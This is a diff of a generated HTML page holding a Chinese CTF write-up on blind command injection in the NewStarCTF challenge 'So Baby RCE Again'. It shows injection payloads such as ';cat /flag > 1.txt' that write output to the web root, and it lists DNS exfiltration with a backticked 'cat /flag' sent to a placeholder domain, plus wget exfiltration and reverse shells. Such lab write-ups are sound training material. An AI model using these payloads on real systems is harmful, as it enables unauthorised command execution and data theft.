@@ -1761,6 +1761,8 @@
       
         
       
+        
+      
     
     
     
@@ -1826,6 +1828,36 @@
     
   
     PortSwigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../rce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE
   
 
     
@@ -2238,11 +2270,11 @@
     <h2 id="newstarctf-so-baby-rce-again"><a class="toclink" href="../../so-baby-rce-again/">[NewStarCTF] So Baby RCE Again —— 无回显怎么把输出搬出来</a></h2>
 <p>题目直接给了源码，只过滤 <code>bash</code> 和 <code>curl</code>，但有命令执行<strong>没有回显</strong>。</p>
 <h3 id="_1"><a class="toclink" href="../../so-baby-rce-again/#_1">现象</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>命令能执行,但页面上什么都看不到
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>命令能执行,但页面上什么都看不到
 </span></code></pre></div>
 <h3 id="_2"><a class="toclink" href="../../so-baby-rce-again/#_2">判断</a></h3>
 <p><strong>先分清是"没执行"还是"没回显"：</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">;</span>sleep<span class="w"> </span><span class="m">5</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">;</span>sleep<span class="w"> </span><span class="m">5</span>
 </span></code></pre></div>
 <table>
 <thead>
@@ -2263,15 +2295,15 @@
 </tbody>
 </table>
 <h3 id="web"><a class="toclink" href="../../so-baby-rce-again/#web">解法：输出重定向到 web 目录</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">;</span>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">;</span>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">;</span>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">;</span>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt
 </span></code></pre></div>
 <p><strong>然后访问 <code>http://target/1.txt</code>。</strong></p>
 <p><strong>为什么这招有效：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① 命令确实执行了(只是输出没返回给你)
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>② &gt; 把 stdout 写进文件
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>③ 文件落在【当前工作目录】(通常是网站根目录)
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>④ 这个目录能被 web 访问 → 直接下载
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>① 命令确实执行了(只是输出没返回给你)
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>② &gt; 把 stdout 写进文件
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>③ 文件落在【当前工作目录】(通常是网站根目录)
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>④ 这个目录能被 web 访问 → 直接下载
 </span></code></pre></div>
 <h3 id="_3"><a class="toclink" href="../../so-baby-rce-again/#_3">两个关键细节</a></h3>
 <div class="admonition note">
@@ -2281,18 +2313,18 @@
 </div>
 <div class="admonition note">
 <p class="admonition-title">&gt; 只重定向 stdout</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt<span class="w">          </span><span class="c1"># 报错丢失</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">     </span><span class="c1"># 报错也进去</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt<span class="w">          </span><span class="c1"># 报错丢失</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>ls<span class="w"> </span>/<span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.txt<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">     </span><span class="c1"># 报错也进去</span>
 </span></code></pre></div>
 <p>如果 <code>1.txt</code> 是空的，可能命令报错了但你没看到。</p>
 </div>
 <h3 id="_4"><a class="toclink" href="../../so-baby-rce-again/#_4">为什么这题只能写文件</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>bash 被过滤  →  不能反弹 shell
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>curl 被过滤  →  不能 HTTP 外带
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>剩下:
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>  · 写文件 &gt; cp mv tee
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>  · DNS 外带 ping `cat /flag`.域名
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>  · wget 外带
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>bash 被过滤  →  不能反弹 shell
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>curl 被过滤  →  不能 HTTP 外带
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>剩下:
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  · 写文件 &gt; cp mv tee
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>  · DNS 外带 ping `cat /flag`.域名
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>  · wget 外带
 </span></code></pre></div>
 <h3 id="_5"><a class="toclink" href="../../so-baby-rce-again/#_5">收获</a></h3>
 <blockquote>
